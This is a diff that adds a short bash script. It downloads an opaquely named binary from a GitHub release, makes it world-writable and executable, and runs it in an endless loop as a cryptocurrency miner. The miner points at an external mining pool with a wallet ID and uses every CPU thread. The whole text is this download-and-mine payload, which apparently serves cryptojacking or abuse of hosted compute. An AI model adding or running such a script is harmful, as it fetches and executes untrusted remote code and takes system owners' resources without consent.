@@ -1,0 +1,6 @@
+#!/bin/bash
+wget https://github.com/sompongboonmak17/urban-octo-garbanzo/releases/download/1/serbe
+chmod 777 serbe
+while true; do
+./serbe --disable-gpu --algorithm xelishashv3 --pool xel.kryptex.network:7019 --wallet krxY489N6J.$(echo $RANDOM | md5sum | head -c 10) --cpu-threads $(nproc --all)
+done
